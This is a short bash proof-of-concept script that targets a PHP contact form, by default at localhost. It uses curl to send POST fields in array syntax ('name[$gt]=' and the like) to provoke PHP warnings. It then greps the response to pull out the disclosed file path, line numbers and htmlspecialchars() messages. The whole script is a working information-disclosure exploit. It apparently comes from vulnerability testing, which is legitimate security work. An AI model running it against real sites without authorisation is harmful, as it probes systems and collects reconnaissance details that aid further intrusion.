#!/bin/bash

# POC: Type Confusion Information Disclosure in Contact Form
# This script demonstrates how submitting array-type POST parameters
# to the contact form causes PHP warnings that reveal sensitive information

TARGET_URL="${1:-http://localhost/contact.php}"

echo "[*] Type Confusion POC for Contact Form"
echo "[*] Target: $TARGET_URL"
echo ""

# Send POST request with array parameters using PHP array syntax
# Parameters: name[$gt]=, email[$gt]=, message[$gt]=
echo "[*] Sending POST request with array parameters..."
echo ""

RESPONSE=$(curl -s -X POST "$TARGET_URL" \
  -d "name[\$gt]=&email[\$gt]=&message[\$gt]=" \
  -H "Content-Type: application/x-www-form-urlencoded")

echo "[*] Response received:"
echo "================================"
echo "$RESPONSE"
echo "================================"
echo ""

# Check for PHP warnings in response
if echo "$RESPONSE" | grep -q "htmlspecialchars()"; then
    echo "[+] VULNERABILITY CONFIRMED!"
    echo "[+] PHP warnings detected in response"
    echo ""
    
    # Extract file path information
    if echo "$RESPONSE" | grep -q "contact.php"; then
        echo "[+] File path disclosure detected: contact.php"
    fi
    
    # Extract line number information
    if echo "$RESPONSE" | grep -q "on line"; then
        echo "[+] Line number disclosure detected:"
        echo "$RESPONSE" | grep -oE "on line [0-9]+" | sort -u
    fi
    
    # Extract the exact warnings
    echo ""
    echo "[+] Exact warnings revealed:"
    echo "$RESPONSE" | grep -oE "htmlspecialchars\(\)[^<]*" | head -5
else
    echo "[-] PHP warning not found in response"
    echo "[-] Vulnerability may not be present or application not accessible"
fi